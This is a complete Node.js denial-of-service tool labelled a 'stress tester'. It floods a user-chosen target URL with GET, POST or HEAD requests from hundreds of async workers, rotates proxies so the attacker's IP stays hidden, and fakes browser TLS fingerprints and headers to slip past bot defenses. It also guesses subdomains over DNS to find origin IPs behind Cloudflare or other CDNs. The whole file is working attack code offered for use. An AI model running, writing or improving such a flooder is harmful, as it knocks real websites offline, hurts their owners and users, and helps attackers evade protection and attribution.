#!/usr/bin/env node

const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const https = require('https');
const http = require('http');
const tls = require('tls');
const readline = require('readline');
const fs = require('fs').promises;
const dns = require('dns').promises;
const crypto = require('crypto');
const { URL } = require('url');

const BANNER = `
╔══════════════════════════════════════════════════════════╗
║    ADVANCED STRESS TESTER V4.5 - JAVASCRIPT EDITION     ║
║    Ultra-Fast Async + JA3 + Browser Emulation           ║
╚══════════════════════════════════════════════════════════╝
`;

const BROWSER_PROFILES = [
    {
        name: 'Chrome 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'e3b0c44298fc1c149afbf4c8996fb924',
        webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620, OpenGL 4.1)'
    },
    {
        name: 'Firefox 121 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'TE': 'trailers'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '7f83b1657ff1fc53b92dc18148a1d65d',
        webgl: 'Mozilla'
    },
    {
        name: 'Chrome 119 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'a1b2c3d4e5f6789012345678901234ab',
        webgl: 'ANGLE (Apple, Apple M1, OpenGL 4.1)'
    },
    {
        name: 'Safari 17 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '9f86d081884c7d659a2feaa0c55ad015',
        webgl: 'Apple GPU'
    },
    {
        name: 'Edge 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'b94d27b9934d3e08a52e52d7da7dabfa',
        webgl: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1660, OpenGL 4.5)'
    }
];

const config = {
    proxies: [],
    workingProxies: new Set(),
    debug: false,
    stats: {
        totalRequests: 0,
        successful: 0,
        failed: 0,
        bytesSent: 0,
        bytesReceived: 0,
        statusCodes: {},
        startTime: null
    }
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getAdvancedHeaders(url, profile = null) {
    if (!profile) profile = getRandomElement(BROWSER_PROFILES);
    
    const headers = {
        'User-Agent': profile.ua,
        'Accept': profile.headers['Accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': getRandomElement(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5']),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': getRandomElement(['document', 'empty']),
        'Sec-Fetch-Mode': getRandomElement(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': getRandomElement(['none', 'same-origin', 'cross-site', 'same-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': getRandomElement(['max-age=0', 'no-cache', 'no-store']),
        'Pragma': 'no-cache',
        ...profile.headers
    };
    
    if (profile.canvas) {
        headers['X-Canvas-Fingerprint'] = profile.canvas;
    }
    
    if (profile.webgl) {
        headers['X-WebGL-Vendor'] = profile.webgl;
    }
    
    if (Math.random() > 0.7) {
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }
    
    if (Math.random() > 0.5) {
        headers['Referer'] = url;
    }
    
    if (profile.name.includes('Chrome') || profile.name.includes('Edge')) {
        headers['sec-ch-ua-arch'] = '"x86"';
        headers['sec-ch-ua-bitness'] = '"64"';
        headers['sec-ch-ua-model'] = '""';
    }
    
    return headers;
}

function addCacheBuster(url) {
    const separator = url.includes('?') ? '&' : '?';
    const params = [
        `_=${Date.now()}`,
        `rand=${Math.floor(Math.random() * 900000) + 100000}`,
        `nocache=${crypto.randomBytes(4).toString('hex')}`
    ];
    return url + separator + getRandomElement(params);
}

function createTLSAgent(profile, proxyUrl = null) {
    const tlsOptions = {
        rejectUnauthorized: false,
        ciphers: profile.tls.ciphers,
        minVersion: profile.tls.minVersion,
        maxVersion: profile.tls.maxVersion,
        ecdhCurve: profile.tls.ecdhCurve,
        honorCipherOrder: true,
        sessionTimeout: 300,
        keepAlive: true,
        maxSockets: 100
    };
    
    if (profile.tls.sigalgs) {
        tlsOptions.sigalgs = profile.tls.sigalgs;
    }
    
    if (proxyUrl) {
        return proxyUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl, tlsOptions)
            : new HttpProxyAgent(proxyUrl);
    }
    
    return new https.Agent(tlsOptions);
}

function addRealisticDelay() {
    return new Promise(resolve => {
        const delay = Math.floor(Math.random() * 50) + 10;
        setTimeout(resolve, delay);
    });
}

async function testProxy(proxyUrl, timeout = 1200) {
    const testEndpoints = [
        'http://1.1.1.1',
        'http://8.8.8.8',
        'http://www.google.com'
    ];
    
    const endpoint = testEndpoints[Math.floor(Math.random() * testEndpoints.length)];
    
    try {
        const agent = proxyUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl)
            : new HttpProxyAgent(proxyUrl);
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        const response = await axios.get(endpoint, {
            httpAgent: agent,
            httpsAgent: agent,
            timeout: timeout,
            signal: controller.signal,
            validateStatus: () => true,
            maxRedirects: 3
        });
        
        clearTimeout(timeoutId);
        
        return response.status >= 200 && response.status < 500;
    } catch (error) {
        return false;
    }
}

async function quickTestProxy(proxyUrl) {
    try {
        const agent = proxyUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl)
            : new HttpProxyAgent(proxyUrl);
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 800);
        
        await axios.get('http://1.1.1.1', {
            httpAgent: agent,
            httpsAgent: agent,
            timeout: 800,
            signal: controller.signal,
            validateStatus: () => true
        });
        
        clearTimeout(timeoutId);
        return true;
    } catch {
        return false;
    }
}

async function loadProxies(filePath = 'proxies.txt') {
    try {
        const data = await fs.readFile(filePath, 'utf-8');
        const raw = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        
        if (raw.length === 0) {
            console.log('[!] No proxies found in proxies.txt');
            console.log('[!] Format: ip:port (one per line)');
            console.log('[!] Example: 123.45.67.89:8080');
            return false;
        }
        
        console.log(`[*] Loading ${raw.length} proxies...`);
        console.log('[!] IMPORTANT: Validating proxies with 3-phase system');
        
        const temp = raw.map(proxy => 
            proxy.startsWith('http') ? proxy : `http://${proxy}`
        );
        
        console.log('\n[PHASE 1/3] Quick connectivity test (300 parallel)...');
        const phase1Start = Date.now();
        const phase1Candidates = [];
        
        const chunkSize = 300;
        for (let i = 0; i < temp.length; i += chunkSize) {
            const chunk = temp.slice(i, i + chunkSize);
            const progress = i + chunk.length;
            
            const results = await Promise.allSettled(
                chunk.map(proxy => quickTestProxy(proxy).then(valid => ({ proxy, valid })))
            );
            
            results.forEach(result => {
                if (result.status === 'fulfilled' && result.value.valid) {
                    phase1Candidates.push(result.value.proxy);
                }
            });
            
            process.stdout.write(`\r[*] Phase 1: ${progress}/${temp.length} | Found: ${phase1Candidates.length} candidates`);
        }
        
        const phase1Time = ((Date.now() - phase1Start) / 1000).toFixed(1);
        console.log(`\n[+] Phase 1 complete in ${phase1Time}s: ${phase1Candidates.length}/${temp.length} passed quick test\n`);
        
        if (phase1Candidates.length === 0) {
            console.log('[!] NO PROXIES passed quick test!');
            return false;
        }
        
        console.log('[PHASE 2/3] Deep validation test (200 parallel)...');
        const phase2Start = Date.now();
        const phase2Validated = [];
        
        const chunk2Size = 200;
        for (let i = 0; i < phase1Candidates.length; i += chunk2Size) {
            const chunk = phase1Candidates.slice(i, i + chunk2Size);
            const progress = i + chunk.length;
            
            const results = await Promise.allSettled(
                chunk.map(proxy => testProxy(proxy, 1200).then(valid => ({ proxy, valid })))
            );
            
            results.forEach(result => {
                if (result.status === 'fulfilled' && result.value.valid) {
                    phase2Validated.push(result.value.proxy);
                }
            });
            
            process.stdout.write(`\r[*] Phase 2: ${progress}/${phase1Candidates.length} | Validated: ${phase2Validated.length}`);
        }
        
        const phase2Time = ((Date.now() - phase2Start) / 1000).toFixed(1);
        console.log(`\n[+] Phase 2 complete in ${phase2Time}s: ${phase2Validated.length}/${phase1Candidates.length} passed validation\n`);
        
        if (phase2Validated.length === 0) {
            console.log('[!] NO PROXIES passed deep validation!');
            return false;
        }
        
        console.log('[PHASE 3/3] Reliability test (150 parallel)...');
        const phase3Start = Date.now();
        
        const chunk3Size = 150;
        for (let i = 0; i < phase2Validated.length; i += chunk3Size) {
            const chunk = phase2Validated.slice(i, i + chunk3Size);
            const progress = i + chunk.length;
            
            const results = await Promise.allSettled(
                chunk.map(async proxy => {
                    const test1 = await testProxy(proxy, 1000);
                    if (!test1) return { proxy, valid: false };
                    
                    await new Promise(resolve => setTimeout(resolve, 50));
                    const test2 = await testProxy(proxy, 1000);
                    
                    return { proxy, valid: test2 };
                })
            );
            
            results.forEach(result => {
                if (result.status === 'fulfilled' && result.value.valid) {
                    config.proxies.push(result.value.proxy);
                }
            });
            
            process.stdout.write(`\r[*] Phase 3: ${progress}/${phase2Validated.length} | Reliable: ${config.proxies.length}`);
        }
        
        const phase3Time = ((Date.now() - phase3Start) / 1000).toFixed(1);
        const totalTime = ((Date.now() - phase1Start) / 1000).toFixed(1);
        
        console.log(`\n[+] Phase 3 complete in ${phase3Time}s: ${config.proxies.length}/${phase2Validated.length} are reliable\n`);
        
        if (config.proxies.length === 0) {
            console.log('[!] NO WORKING PROXIES FOUND!');
            console.log('[!] Your real IP WILL be exposed if you continue');
            return false;
        }
        
        console.log('='.repeat(70));
        console.log(`[+] VALIDATION COMPLETE in ${totalTime}s`);
        console.log(`[+] Loaded ${config.proxies.length} RELIABLE proxies from ${temp.length} total`);
        console.log(`[+] Survival rate: ${((config.proxies.length / temp.length) * 100).toFixed(1)}%`);
        console.log(`[+] Your real IP will be HIDDEN behind these proxies`);
        console.log('='.repeat(70));
        
        return true;
    } catch (err) {
        console.log('[!] proxies.txt not found!');
        console.log('[!] Create a file named "proxies.txt" in the same folder');
        console.log('[!] Format: ip:port (one per line)');
        return false;
    }
}

async function discoverOriginIPs(domain) {
    console.log(`[*] Discovering origin IPs for ${domain}...`);
    const foundIPs = new Set();
    
    const subdomains = [
        'direct', 'origin', 'direct-connect', 'direct-origin',
        'dev', 'staging', 'test', 'beta', 'alpha',
        'admin', 'panel', 'cpanel', 'webmail',
        'mail', 'smtp', 'ftp', 'api', 'api2'
    ];
    
    console.log(`[*] Scanning ${subdomains.length} subdomains...`);
    
    const cdnRanges = ['104.', '172.', '162.', '13.', '34.', '35.', '54.', '52.', '23.', '95.', '96.', '151.'];
    
    await Promise.all(subdomains.map(async sub => {
        try {
            const testDomain = `${sub}.${domain}`;
            const addresses = await dns.resolve4(testDomain);
            addresses.forEach(ip => {
                if (!cdnRanges.some(range => ip.startsWith(range))) {
                    foundIPs.add(ip);
                    console.log(`  [+] Found: ${testDomain} -> ${ip}`);
                }
            });
        } catch {}
    }));
    
    try {
        const mainIPs = await dns.resolve4(domain);
        mainIPs.forEach(ip => foundIPs.add(ip));
    } catch {}
    
    if (foundIPs.size > 0) {
        console.log(`[+] Discovered ${foundIPs.size} potential origin IPs`);
        return Array.from(foundIPs);
    } else {
        console.log('[!] No origin IPs found, using domain directly');
        return [domain];
    }
}

function updateStats(success, statusCode = null, bytesSent = 0, bytesReceived = 0) {
    config.stats.totalRequests++;
    if (success) {
        config.stats.successful++;
    } else {
        config.stats.failed++;
    }
    config.stats.bytesSent += bytesSent;
    config.stats.bytesReceived += bytesReceived;
    
    if (statusCode) {
        config.stats.statusCodes[statusCode] = (config.stats.statusCodes[statusCode] || 0) + 1;
    }
}

function displayStats() {
    const elapsed = (Date.now() - config.stats.startTime) / 1000;
    const reqRate = config.stats.totalRequests / elapsed;
    const successRate = config.stats.totalRequests > 0 
        ? (config.stats.successful / config.stats.totalRequests * 100).toFixed(1)
        : 0;
    
    console.log('\n' + '='.repeat(70));
    console.log(`[STATS] Time: ${elapsed.toFixed(1)}s | Requests: ${config.stats.totalRequests} | Rate: ${reqRate.toFixed(1)} req/s`);
    console.log(`[STATS] Success: ${config.stats.successful} (${successRate}%) | Failed: ${config.stats.failed}`);
    console.log(`[STATS] Sent: ${(config.stats.bytesSent / 1024).toFixed(1)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(1)} KB`);
    
    if (Object.keys(config.stats.statusCodes).length > 0) {
        const codes = Object.entries(config.stats.statusCodes)
            .sort(([a], [b]) => a - b)
            .map(([k, v]) => `${k}:${v}`)
            .join(', ');
        console.log(`[STATS] Status Codes: ${codes}`);
    }
    
    if (config.proxies.length > 0 && config.workingProxies.size > 0) {
        const workingIPs = Array.from(config.workingProxies).slice(0, 10).join(', ');
        const extra = config.workingProxies.size > 10 ? ` ... (+${config.workingProxies.size - 10} more)` : '';
        console.log(`[STATS] Working Proxies: ${config.workingProxies.size} | IPs: ${workingIPs}${extra}`);
    }
    
    console.log('='.repeat(70));
}

class HTTPFlood {
    constructor(url, duration, threads, method, useOrigin) {
        this.url = url;
        this.duration = duration;
        this.threads = threads;
        this.method = method;
        this.useOrigin = useOrigin;
        this.running = false;
        this.originIPs = [];
        this.domain = new URL(url).hostname;
    }
    
    async prepare() {
        console.log(`\n[*] Preparing ${this.method} flood attack...`);
        console.log(`[*] Target: ${this.url}`);
        console.log(`[*] Duration: ${this.duration}s`);
        console.log(`[*] Threads: ${this.threads}`);
        
        if (this.useOrigin && this.domain) {
            this.originIPs = await discoverOriginIPs(this.domain);
        }
        
        if (config.proxies.length > 0) {
            console.log(`[*] Loaded ${config.proxies.length} proxies for rotation`);
            config.workingProxies.clear();
        }
        
        config.stats.startTime = Date.now();
        this.running = true;
    }
    
    async worker(threadId) {
        let currentProxyIndex = config.proxies.length > 0 ? threadId % config.proxies.length : 0;
        let consecutiveFails = 0;
        let localCount = 0;
        
        const endTime = Date.now() + this.duration * 1000;
        
        while (this.running && Date.now() < endTime) {
            try {
                const profile = getRandomElement(BROWSER_PROFILES);
                const headers = getAdvancedHeaders(this.url, profile);
                
                let targetUrl = this.url;
                if (this.originIPs.length > 0 && this.useOrigin) {
                    const originIP = getRandomElement(this.originIPs);
                    if (originIP !== this.domain) {
                        targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
                        headers['Host'] = this.domain;
                    }
                }
                
                targetUrl = addCacheBuster(targetUrl);
                
                const axiosConfig = {
                    method: this.method.toLowerCase(),
                    url: targetUrl,
                    headers,
                    timeout: 3000,
                    maxRedirects: 5,
                    validateStatus: () => true,
                    decompress: true
                };
                
                if (config.proxies.length > 0) {
                    const proxy = config.proxies[currentProxyIndex];
                    axiosConfig.proxy = false;
                    axiosConfig.httpsAgent = createTLSAgent(profile, proxy);
                    axiosConfig.httpAgent = createTLSAgent(profile, proxy);
                } else {
                    axiosConfig.httpsAgent = createTLSAgent(profile, null);
                    axiosConfig.httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100 });
                }
                
                if (this.method === 'POST') {
                    axiosConfig.data = { data: 'x'.repeat(Math.floor(Math.random() * 900) + 100) };
                }
                
                const response = await axios(axiosConfig);
                
                const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
                const bytesReceived = response.data ? String(response.data).length : 0;
                
                updateStats(true, response.status, bytesSent, bytesReceived);
                
                if (config.debug && localCount % 100 === 0) {
                    console.log(`[DEBUG] Thread ${threadId}: ${response.status} - ${bytesSent}b sent, ${bytesReceived}b received`);
                }
                
                if (config.proxies.length > 0 && localCount % 10 === 0) {
                    const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
                    config.workingProxies.add(proxyIP);
                }
                
                consecutiveFails = 0;
                localCount++;
                
            } catch (error) {
                updateStats(false);
                consecutiveFails++;
                
                if (config.debug && consecutiveFails <= 3) {
                    console.log(`[DEBUG] Thread ${threadId} error: ${error.message}`);
                }
                
                if (consecutiveFails >= 2 && config.proxies.length > 0) {
                    currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
                    consecutiveFails = 0;
                }
                
                await new Promise(resolve => setTimeout(resolve, 10));
            }
        }
    }
    
    async start() {
        await this.prepare();
        
        console.log(`[*] Starting attack with ${this.threads} async workers...`);
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker(i));
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => {
            this.running = false;
        }, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        
        displayStats();
        console.log('\n[+] Attack completed!');
    }
}

async function main() {
    console.log(BANNER);
    
    const debugInput = await question('[?] Enable debug mode? (y/n): ');
    config.debug = debugInput.toLowerCase() === 'y';
    
    const proxyInput = await question('[?] Use proxies? (y/n): ');
    if (proxyInput.toLowerCase() === 'y') {
        const loaded = await loadProxies();
        if (!loaded) {
            console.log('[!] Continuing without proxies - YOUR IP WILL BE VISIBLE!');
        }
    }
    
    console.log('\n[SELECT ATTACK TYPE]');
    console.log('  1. HTTP GET Flood (Ultra-Fast)');
    console.log('  2. HTTP POST Flood (Ultra-Fast)');
    console.log('  3. HTTP HEAD Flood');
    
    const choice = await question('\n[>] Select attack (1-3): ');
    
    if (['1', '2', '3'].includes(choice)) {
        const url = await question('[>] Enter target URL (e.g., example.com or https://example.com): ');
        
        let finalUrl = url.trim();
        if (!finalUrl.startsWith('http')) {
            finalUrl = 'https://' + finalUrl;
            console.log(`[*] Added HTTPS protocol: ${finalUrl}`);
        }
        
        const duration = parseInt(await question('[>] Duration (seconds): '));
        const threads = parseInt(await question('[>] Number of threads (10-500): '));
        
        const bypassCF = await question('[?] Attempt Cloudflare/CDN bypass? (y/n): ');
        const useOrigin = bypassCF.toLowerCase() === 'y';
        
        const method = choice === '1' ? 'GET' : choice === '2' ? 'POST' : 'HEAD';
        
        const attack = new HTTPFlood(finalUrl, duration, threads, method, useOrigin);
        await attack.start();
    } else {
        console.log('[!] Invalid choice!');
    }
    
    rl.close();
    process.exit(0);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\n[!] Error:', err.message);
        rl.close();
        process.exit(1);
    });
}
